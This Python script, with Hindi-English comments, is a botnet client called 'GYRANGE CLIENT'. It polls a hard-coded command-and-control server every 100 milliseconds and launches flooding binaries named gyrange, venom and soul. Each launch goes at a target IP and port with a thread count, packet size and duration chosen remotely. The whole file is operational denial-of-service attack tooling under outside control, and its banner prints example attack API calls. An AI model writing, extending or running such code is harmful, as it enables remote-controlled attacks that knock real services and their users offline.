import requests
import subprocess
import time
import threading
import json

# CONFIG
SERVER_URL = 'http://15.207.110.63:8010'
POLL_INTERVAL = 0.1  # 100ms - SUPER FAST POLLING
BINARY_NAME = './gyrange'  # Default binary

# State
active_process = None
process_lock = threading.Lock()
last_attack_id = None
current_binary = 'gyrange'

def execute_attack(attack_config):
    """Binary को INSTANT run करो"""
    global active_process, last_attack_id, current_binary
    
    attack_id = attack_config['attack_id']
    binary_name = attack_config.get('binary', 'gyrange')
    current_binary = binary_name
    
    # Avoid running same attack twice
    if attack_id == last_attack_id:
        return
    
    last_attack_id = attack_id
    
    # Stop any existing attack
    with process_lock:
        if active_process and active_process.poll() is None:
            print(f"[🛑] Stopping previous attack for new one")
            active_process.terminate()
            time.sleep(0.1)
            if active_process.poll() is None:
                active_process.kill()
    
    # Build command based on binary
    cmd = attack_config['command'].split()
    
    # Update binary path
    if not cmd[0].startswith('./'):
        cmd[0] = f'./{cmd[0]}'
    else:
        cmd[0] = f'./{cmd[0].replace("./", "")}'
    
    print(f"\n[⚡] INSTANT ATTACK COMMAND RECEIVED!")
    print(f"[🔧] Binary: {binary_name}")
    print(f"[🎯] Target: {attack_config['target_ip']}:{attack_config['target_port']}")
    print(f"[⏱️] Duration: {attack_config['time']}s")
    print(f"[📊] Threads: {attack_config.get('threads', 1000)}")
    if 'pkt' in attack_config and attack_config['pkt']:
        print(f"[📦] Packet Size: {attack_config['pkt']}")
    if 'burst' in attack_config and attack_config['burst']:
        print(f"[💥] Burst: {attack_config['burst']}")
    print(f"[▶] Executing: {' '.join(cmd)}")
    
    try:
        with process_lock:
            active_process = subprocess.Popen(cmd)
            print(f"[✓] Attack PID: {active_process.pid}")
        
        # Monitor process
        def monitor_process():
            active_process.wait()
            print(f"[✓] Attack completed: {attack_id}")
        
        threading.Thread(target=monitor_process, daemon=True).start()
        
    except Exception as e:
        print(f"[!] Attack failed: {e}")

def stop_current_attack():
    """Current attack stop करो"""
    global active_process, last_attack_id
    
    with process_lock:
        if active_process and active_process.poll() is None:
            print(f"[🛑] STOP COMMAND RECEIVED - Terminating attack")
            active_process.terminate()
            time.sleep(0.2)
            if active_process.poll() is None:
                active_process.kill()
            print(f"[✓] Attack stopped")
        
        last_attack_id = None
        active_process = None

def fast_poll_server():
    """Server को SUPER FAST poll करो"""
    while True:
        try:
            # Fast GET request with timeout
            response = requests.get(
                f'{SERVER_URL}/gyrange/',
                timeout=1  # 1 second timeout
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if isinstance(data, list) and data:
                    for item in data:
                        if item.get('instant') and 'attack' in item:
                            attack = item['attack']
                            
                            # Check if it's a stop command
                            if attack.get('command') == 'STOP':
                                stop_current_attack()
                                continue
                            
                            # Normal attack
                            execute_attack(attack)
                            break  # Process one at a time
            
            # Also check for stop via separate endpoint
            try:
                stop_check = requests.get(f'{SERVER_URL}/gyrange/checkstop', timeout=0.5)
                if stop_check.status_code == 200:
                    stop_data = stop_check.json()
                    if stop_data.get('stop'):
                        stop_current_attack()
            except:
                pass
                
        except requests.RequestException:
            # Connection error, try again
            pass
        except Exception as e:
            print(f"[!] Poll error: {e}")
        
        # SUPER FAST POLLING - 100ms
        time.sleep(POLL_INTERVAL)

def check_current_status():
    """Current status display करो"""
    while True:
        with process_lock:
            if active_process:
                status = "RUNNING" if active_process.poll() is None else "COMPLETED"
                print(f"[📊] Status: {current_binary} Attack {status} | PID: {active_process.pid}", end='\r')
            else:
                print(f"[📊] Status: Ready (No active attack) - Waiting for commands...", end='\r')
        
        time.sleep(1)

def main():
    print("="*70)
    print("⚡⚡⚡ GYRANGE CLIENT ⚡⚡⚡")
    print("="*70)
    print(f"Server: {SERVER_URL}")
    print(f"Poll Interval: {POLL_INTERVAL*1000}ms (SUPER FAST)")
    print(f"Supported Binaries: gyrange, venom, soul")
    print("="*70)
    print("API Examples:")
    print("1. /gyrange/?bin=gyrange&ip=1.1.1.1&port=80&time=120")
    print("2. /gyrange/?bin=venom&ip=1.1.1.1&port=80&time=120&threads=1000")
    print("3. /gyrange/?bin=soul&ip=1.1.1.1&port=80&time=120&thread=1000&pkt=9")
    print("="*70)
    print("[✓] Ready for INSTANT attacks...")
    print("[⚡] Will attack within 100ms of server command!")
    print("="*70)
    
    # Start polling thread
    poll_thread = threading.Thread(target=fast_poll_server, daemon=True)
    poll_thread.start()
    
    # Start status thread
    status_thread = threading.Thread(target=check_current_status, daemon=True)
    status_thread.start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Shutting down...")
        stop_current_attack()

if __name__ == '__main__':

    main()
